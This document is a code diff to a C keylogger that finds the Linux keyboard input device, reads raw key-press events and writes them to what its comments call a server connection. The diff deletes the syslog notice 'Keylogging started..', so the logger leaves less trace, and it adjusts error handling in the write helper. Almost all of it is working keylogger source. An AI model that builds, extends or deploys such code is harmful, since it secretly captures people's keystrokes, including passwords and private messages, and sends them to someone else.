@@ -1,8 +1,10 @@
 /* Developed by Fabio Cinicolo */
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <syslog.h>
 #include <string.h>
 #include <errno.h>
 #include <signal.h>
@@ -31,8 +33,6 @@ void startKeylogger(int keyboard, int fd)
     sigaction(SIGPIPE, &sa, NULL);
     kbd_events = malloc(sizeof(event) * MAX_EVENTS);
 
-    syslog(LOG_INFO, "Keylogging started..");
-
     while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
     {
         to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
@@ -46,7 +46,7 @@ void startKeylogger(int keyboard, int fd)
                 if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
                     kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
             }
-            if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0)
+            if (!writeEventsIntoFile(fd, kbd_events, j * event_size))
                 goto end;
         }
     }
@@ -69,11 +69,11 @@ int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
     {
         written = write(fd, events, to_write);
         if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
-            return -1;   /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
+            return 0;    /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
         events += written;
         to_write -= written;
     } while (to_write > 0);
-    return 0;
+    return 1;
 }
 
 int findKeyboardDevice(char *dir_path)
@@ -100,9 +100,8 @@ int findKeyboardDevice(char *dir_path)
         struct stat file_info;
 
         if (lstat(file_path, &file_info) < 0) /* Getting current file info */
-        {
-            continue;
-        }
+            continue;                         /* Skip to the next file of the directory */
+
         if (!S_ISDIR(file_info.st_mode)) /* If current file is not a directory.. */
         {
             if (S_ISCHR(file_info.st_mode)) /* .. if it is a character device .. */
@@ -122,11 +121,11 @@ int findKeyboardDevice(char *dir_path)
             path_with_slash[strlen(file_path)] = '/'; /* Appending a slash to the path */
             path_with_slash[strlen(file_path) + 1] = '\0';
             int kbd_fd = findKeyboardDevice(path_with_slash); /* .. recursive call over this directory to check for its files */
-            if (kbd_fd != -1)
+            if (kbd_fd >= 0) /* If terminated call found the keyboard device, we propagate it */
             {
                 free(file_path);
                 free(path_with_slash);
-                return kbd_fd; /* Propagate descriptor to previous calls */
+                return kbd_fd;
             }
         }
     }
